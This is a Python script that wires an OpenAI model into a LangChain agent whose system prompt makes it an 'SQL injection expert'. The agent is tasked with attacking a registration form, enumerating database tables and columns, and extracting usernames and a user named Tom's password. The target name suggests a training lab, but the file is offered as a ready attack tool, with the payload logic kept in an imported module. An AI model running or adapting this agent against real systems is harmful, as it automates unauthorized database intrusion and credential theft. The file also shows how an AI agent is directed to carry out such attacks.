from langchain_openai import ChatOpenAI
from langchain.agents import AgentExecutor, create_openai_functions_agent
from langchain_core.prompts import ChatPromptTemplate, MessagesPlaceholder, SystemMessagePromptTemplate, HumanMessagePromptTemplate
from langchain_core.tools import Tool
from typing import List, Optional, Any
import json
import logging
import sys
from sql_injection_tools import Config, TableEnumerator, ColumnEnumerator, DataExtractor

# Set up logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.StreamHandler(sys.stdout),
        logging.FileHandler('sql_injection_agent.log')
    ]
)
logger = logging.getLogger(__name__)

# Initialize our SQL injection tools
try:
    config = Config()
    table_enum = TableEnumerator(config)
    column_enum = ColumnEnumerator(config)
    data_extractor = DataExtractor(config)
except Exception as e:
    logger.error(f"Failed to initialize SQL injection tools: {str(e)}")
    raise

def enumerate_tables(tool_input: Any = None) -> List[str]:
    """Find all tables in the database."""
    try:
        logger.info("Enumerating database tables")
        tables = table_enum.enumerate_tables()
        logger.info(f"Found tables: {tables}")
        return tables
    except Exception as e:
        logger.error(f"Error enumerating tables: {str(e)}")
        return []

def enumerate_columns(table_name: str) -> List[str]:
    """Enumerate columns in a specific table."""
    try:
        logger.info(f"Enumerating columns for table: {table_name}")
        columns = column_enum.enumerate_columns(table_name)
        logger.info(f"Found columns for {table_name}: {columns}")
        return columns
    except Exception as e:
        logger.error(f"Error enumerating columns for table {table_name}: {str(e)}")
        return []

def extract_users(tool_input: str) -> List[str]:
    """Extract usernames from a table. Input should be a JSON string with 'table_name' and 'user_column'."""
    try:
        params = json.loads(tool_input)
        logger.info(f"Extracting users from table: {params['table_name']}, column: {params['user_column']}")
        users = data_extractor.extract_usernames(params['table_name'], params['user_column'])
        logger.info(f"Found users: {users}")
        return users
    except json.JSONDecodeError as e:
        logger.error(f"Invalid JSON input for extract_users: {str(e)}")
        return []
    except Exception as e:
        logger.error(f"Error extracting users: {str(e)}")
        return []

def extract_password(tool_input: str) -> Optional[str]:
    """Extract password for a specific user. Input should be a JSON string with 'table_name', 'username', and 'password_column'."""
    try:
        params = json.loads(tool_input)
        logger.info(f"Extracting password for user: {params['username']} from table: {params['table_name']}")
        password = data_extractor.extract_password(
            params['table_name'],
            params['username'],
            params['password_column']
        )
        if password:
            logger.info(f"Successfully found password for user: {params['username']}")
        else:
            logger.warning(f"No password found for user: {params['username']}")
        return password
    except json.JSONDecodeError as e:
        logger.error(f"Invalid JSON input for extract_password: {str(e)}")
        return None
    except Exception as e:
        logger.error(f"Error extracting password: {str(e)}")
        return None

# Define the tools
tools = [
    Tool(
        name="enumerate_tables",
        description="Find all tables in the database",
        func=enumerate_tables,
    ),
    Tool(
        name="enumerate_columns",
        description="Enumerate columns in a specific table. Input should be the table name.",
        func=enumerate_columns,
    ),
    Tool(
        name="extract_users",
        description="Extract usernames from a table. Input should be a JSON string with 'table_name' and 'user_column'",
        func=extract_users,
    ),
    Tool(
        name="extract_password",
        description="Extract password for a specific user. Input should be a JSON string with 'table_name', 'username', and 'password_column'",
        func=extract_password,
    ),
]

def get_prompt():
    system_message = SystemMessagePromptTemplate.from_template(
        """You are an intelligent SQL injection expert analyzing a web application's registration system.

Registration Form Parameters:
- username_reg: Username for registration
- email_reg: Email address
- password_reg: Password
- confirm_password_reg: Password confirmation

You have access to the following tools:

{tool_descriptions}

Strategic Approach:
1. First enumerate all tables in the database to understand the schema
2. For each table, analyze its columns to identify:
   - User-related tables (look for: userid, username, email, password)
   - Authentication tables (look for: credentials, auth, users)
   - Registration-specific tables (look for: registration, signup, new_users)

3. When analyzing potential injection points, consider:
   - Username field: Try SQL injection while providing valid email/password
   - Email field: Test SQL injection with valid username/password
   - Password fields: Attempt injection while maintaining password=confirm_password

4. For each identified table:
   a. Map out the column structure
   b. Identify which columns correspond to registration fields
   c. Look for additional security measures (salt, hash, tokens)
   d. Extract user data to verify table contents

5. Focus on finding Tom's credentials by:
   a. Locating the correct user table
   b. Verifying Tom's existence
   c. Extracting the password using the most efficient method

Tool Usage Examples:
- extract_users: {{"table_name": "users", "user_column": "userid"}}
- extract_password: {{"table_name": "users", "username": "tom", "password_column": "password"}}

Remember:
- Always verify table/column existence before extraction
- Consider the relationship between registration fields
- Look for patterns in how data is stored
- If a tool returns empty/None, adjust your approach

Think strategically about which registration parameter to inject:
1. username_reg: Most direct for user table injection
2. email_reg: Might reveal different validation logic
3. password fields: Could expose password storage mechanisms"""
    )
    
    human_message = HumanMessagePromptTemplate.from_template("{input}")
    
    return ChatPromptTemplate.from_messages([
        system_message,
        human_message,
        MessagesPlaceholder(variable_name="agent_scratchpad"),
    ])

def format_tool_descriptions(tools):
    return "\n".join([f"{tool.name}: {tool.description}" for tool in tools])

def create_sql_injection_agent():
    try:
        logger.info("Creating SQL injection agent")
        llm = ChatOpenAI(temperature=0, model="gpt-4o-mini")
        prompt = get_prompt()
        
        agent = create_openai_functions_agent(llm, tools, prompt)
        
        executor = AgentExecutor.from_agent_and_tools(
            agent=agent,
            tools=tools,
            verbose=True,
            handle_parsing_errors=True,
            max_iterations=10
        )
        logger.info("Successfully created SQL injection agent")
        return executor
    except Exception as e:
        logger.error(f"Failed to create SQL injection agent: {str(e)}")
        raise

def main():
    try:
        print("Starting SQL Injection Agent...")
        print("=" * 50)
        logger.info("Starting SQL injection process")
        
        agent = create_sql_injection_agent()
        tool_descriptions = format_tool_descriptions(tools)
        
        result = agent.invoke({
            "input": "Find Tom's password by first discovering the correct table",
            "tool_descriptions": tool_descriptions
        })
        
        logger.info("SQL injection process completed successfully")
        print("\nAgent completed its task!")
        print("=" * 50)
        print(f"Result: {result}")
        
    except Exception as e:
        logger.error(f"SQL injection process failed: {str(e)}")
        print(f"\nError: {str(e)}")
        sys.exit(1)

if __name__ == "__main__":
    main()
